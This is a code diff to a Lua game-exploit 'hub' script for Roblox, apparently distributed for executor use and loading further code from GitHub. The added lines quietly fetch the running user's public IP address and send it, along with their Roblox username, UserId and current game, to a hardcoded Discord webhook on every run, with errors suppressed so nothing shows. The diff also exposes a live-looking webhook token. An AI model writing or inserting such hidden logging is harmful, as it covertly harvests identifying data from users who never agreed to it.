@@ -19,6 +19,71 @@ local Discord = "https://discord.com/invite/v3dAeMKp4N"
 local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
 local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
 
+-- Webhooks
+local RunWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
+
+-- HTTP Request function (รองรับหลาย executor)
+local request = syn and syn.request or http_request or request
+
+-- Get IP
+local function GetIP()
+    local ip = "Unknown"
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org")
+    end)
+    return ip
+end
+
+-- Send Discord Log
+local function SendLog()
+
+    if not request then return end
+
+    local ip = GetIP()
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🧠 TURK HUB EXECUTED",
+            ["color"] = 3066993,
+            ["fields"] = {
+                {
+                    ["name"] = "Player",
+                    ["value"] = LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserId",
+                    ["value"] = tostring(LocalPlayer.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP Address",
+                    ["value"] = ip,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Game",
+                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["inline"] = false
+                }
+            }
+        }}
+    }
+
+    request({
+        Url = RunWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    })
+
+end
+
+-- ส่ง Log ตอนรัน
+pcall(SendLog)
+
 -- Check Whitelist
 for _,name in pairs(WhitelistPlayers) do
     if LocalPlayer.Name == name then
